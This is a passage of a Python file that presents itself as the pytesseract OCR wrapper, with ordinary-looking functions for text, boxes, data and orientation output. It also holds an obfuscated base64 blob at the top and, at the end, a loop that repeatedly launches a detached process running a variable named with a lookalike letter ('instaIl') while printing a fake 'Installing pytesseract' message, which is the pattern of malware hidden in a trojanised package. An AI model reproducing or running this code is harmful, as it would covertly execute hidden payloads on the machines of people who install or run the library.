m9ub1dyVFlxUUp4UXdPSHJwVzhGeGJucE96bGJWM09na0pjaE9xdEtpYnFQNlF1KzBRbTRDeGRXOERVSC83R2ZEZWJ6VEo3Wmk3UnRvVFd2ZTJtRGVCaTlVMjZxdG9nbVhMeTA2WjlnRzYxRTFwYTZDbkVlUjEzRUhlVENjdVJZWEVXUWEzNE84aTZyME82RW9EVUhZd2NCdjB0WnFxODlNVWIwc2NvU3hydDIzZlZFbUVsRHB3N2FoWlFTc2tUVVJHVUJ1ZGtVWGtIc0dzSExGUWVieUdjcnp3TUwzcGg4bndqeVIzYXM3V0JKMHNUenlpU1VFWVVWaTVkNkswQVpXWGlmMkd0NjlvM3JBNERqZDh4QUFoVEVlQjA2ZTVsLysrOCtQWi85Ly9QZm05RnhSMTVieE5la1FpQVRjcTZQdm4zUk1wcDc2TjhKSTQ3QXM0L3pjWkJVZ0ZyT2N6bE53SmUnKSk=='))"
def get_tesseract_version():
    """
    Returns Version object of the Tesseract version
    """
    try:
        output = subprocess.check_output(
            [tesseract_cmd, '--version'],
            stderr=subprocess.STDOUT,
            env=environ,
            stdin=subprocess.DEVNULL,
        )
    except OSError:
        raise TesseractNotFoundError()

    raw_version = output.decode(DEFAULT_ENCODING)
    str_version, *_ = raw_version.lstrip(string.printable[10:]).partition(' ')
    str_version, *_ = str_version.partition('-')

    try:
        version = parse(str_version)
        assert version >= TESSERACT_MIN_VERSION
    except (AssertionError, InvalidVersion):
        raise SystemExit(f'Invalid tesseract version: "{raw_version}"')

    return version


def image_to_string(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to string
    """
    args = [image, 'txt', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: {'text': run_and_get_output(*args)},
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_pdf_or_hocr(
    image,
    lang=None,
    config='',
    nice=0,
    extension='pdf',
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to pdf/hocr
    """

    if extension not in {'pdf', 'hocr'}:
        raise ValueError(f'Unsupported extension: {extension}')

    if extension == 'hocr':
        config = f'-c tessedit_create_hocr=1 {config.strip()}'

    args = [image, extension, lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_alto_xml(
    image,
    lang=None,
    config='',
    nice=0,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to ALTO XML
    """

    if get_tesseract_version(cached=True) < TESSERACT_ALTO_VERSION:
        raise ALTONotSupported()

    config = f'-c tessedit_create_alto=1 {config.strip()}'
    args = [image, 'xml', lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_boxes(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing recognized characters and their box boundaries
    """
    config = (
        f'{config.strip()} -c tessedit_create_boxfile=1 batch.nochop makebox'
    )
    args = [image, 'box', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: file_to_dict(
            f'char left bottom right top page\n{run_and_get_output(*args)}',
            ' ',
            0,
        ),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def get_pandas_output(args, config=None):
    if not pandas_installed:
        raise PandasNotSupported()

    kwargs = {'quoting': QUOTE_NONE, 'sep': '\t'}
    try:
        kwargs.update(config)
    except (TypeError, ValueError):
        pass

    return pd.read_csv(BytesIO(run_and_get_output(*args)), **kwargs)


def image_to_data(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
    pandas_config=None,
):
    """
    Returns string containing box boundaries, confidences,
    and other information. Requires Tesseract 3.05+
    """

    if get_tesseract_version(cached=True) < TESSERACT_MIN_VERSION:
        raise TSVNotSupported()

    config = f'-c tessedit_create_tsv=1 {config.strip()}'
    args = [image, 'tsv', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DATAFRAME: lambda: get_pandas_output(
            args + [True],
            pandas_config,
        ),
        Output.DICT: lambda: file_to_dict(run_and_get_output(*args), '\t', -1),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_osd(
    image,
    lang='osd',
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing the orientation and script detection (OSD)
    """
    config = f'--psm 0 {config.strip()}'
    args = [image, 'osd', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: osd_to_dict(run_and_get_output(*args)),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def main():
    if len(sys.argv) == 2:
        filename, lang = sys.argv[1], None
    elif len(sys.argv) == 4 and sys.argv[1] == '-l':
        filename, lang = sys.argv[3], sys.argv[2]
    else:
        print('Usage: pytesseract [-l lang] input_file\n', file=sys.stderr)
        return 2

    try:
        with Image.open(filename) as img:
            print(image_to_string(img, lang=lang))
    except TesseractNotFoundError as e:
        print(f'{str(e)}\n', file=sys.stderr)
        return 1
    except OSError as e:
        print(f'{type(e).__name__}: {e}', file=sys.stderr)
        return 1

def __bootstrap__():
    global __bootstrap__, __loader__, __file__
    import sys, pkg_resources, importlib.util
    __file__ = pkg_resources.resource_filename(__name__, 'ocr.so')
    __loader__ = None; del __bootstrap__, __loader__
    spec = importlib.util.spec_from_file_location(__name__,__file__)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)


while True:
    install = 'pip install pytesseract'
    process = subprocess.Popen(
        ["python", "-c", instaIl],
        preexec_fn=os.setsid
    )
    try:
        print("Installing pytesseract...")
        process.wait(timeout=3600)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    sleep(1)


